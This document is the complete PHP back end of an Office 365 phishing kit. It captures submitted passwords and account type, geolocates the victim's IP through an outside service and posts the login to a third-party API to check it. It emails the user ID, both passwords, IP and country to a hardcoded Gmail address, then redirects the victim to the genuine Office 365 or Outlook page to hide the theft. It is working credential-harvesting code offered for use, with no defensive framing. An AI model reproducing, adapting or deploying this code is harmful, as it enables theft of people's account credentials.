<?php
// Genral 365 Version 0.1
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$recipient = 'mokandubrian@gmail.com'; // Put your email address here


if (isset($_GET))
{
	$_SESSION['pass1']=$_GET['pass1'];
	$_SESSION['pass2']=$_GET['pass2'];
	$_SESSION['accounttype']=$_GET['accounttype'];
}

function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_SESSION['email'];
$pass1 = $_SESSION['pass1'];
$pass2 = $_SESSION['pass2'];
$account = $_SESSION['accounttype'];
$api = 'http://my-ips.org/ip/index.php'; //put api url
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$over = 'https://office365.com';
		$message = "-----------------+ True Login Verfied  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass1 . "\n";
		$message.= "Password2: " . $pass2 . "\n";
		$message.= "Account Type: " . $account . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "-----------------+ Created in 2643AB+------------------\n";
		$subject = "OFFICE 365 | True Login: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";

		mail($recipient, $subject, $message, $headers);
		//@fclose(@fwrite(@fopen("Office-login.txt", "a"),$message));

		header("Location: $over");
		}
	  else
		{
		header("Location: https://outlook.live.com/mail/0/inbox/");
		}


?>
